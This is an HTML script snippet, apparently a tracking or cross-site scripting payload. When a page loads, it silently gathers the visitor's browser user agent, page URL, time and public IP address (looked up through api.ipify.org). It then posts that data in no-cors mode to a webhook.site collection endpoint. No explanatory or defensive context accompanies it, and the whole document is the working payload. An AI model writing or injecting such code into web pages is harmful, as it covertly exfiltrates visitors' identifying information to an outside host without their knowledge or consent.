<script>
async function run() {
    const data = {
        ua: navigator.userAgent,
        url: location.href,
        time: new Date().toString()
    };

    try {
        const r = await fetch("https://api.ipify.org?format=json");
        const d = await r.json();
        data.ip = d.ip;
    } catch(e){}

    fetch("https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2", {
        method: "POST",
        mode: "no-cors",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    });
}

run();
</script>
